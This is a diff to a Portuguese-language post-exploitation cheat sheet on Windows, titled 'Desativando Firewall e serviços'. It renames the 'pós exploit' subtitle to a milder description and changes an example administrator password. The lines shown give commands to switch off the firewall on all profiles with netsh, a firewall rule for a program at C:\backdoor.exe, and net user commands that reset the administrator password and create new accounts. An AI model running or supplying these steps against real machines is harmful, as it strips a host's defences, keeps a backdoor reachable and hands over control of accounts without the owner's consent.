@@ -1,7 +1,7 @@
 Desativando Firewall e serviços
 
 
-pós exploit
+pós exploratório, alguns comandos uteis, para desativar fw entre outros serviços
 
 Desativar/Ativar o firewall
 Na shell, execute o comando netsh advfirewall set allprofiles state off para desativar
@@ -19,8 +19,8 @@ program="C:\backdoor.exe"
 
 7. Alterar a senha do administrador
 a. Digite o comando net user para listar os usuários ativos
-b. Através do comando net user administrador 12345 você altera a senha do
-administrador para 12345
+b. Através do comando net user administrador teste123 você altera a senha do
+administrador para teste123
 
 8. Criar usuário
 a. Você poderá criar um usuário com o comando net user usuario1 /add
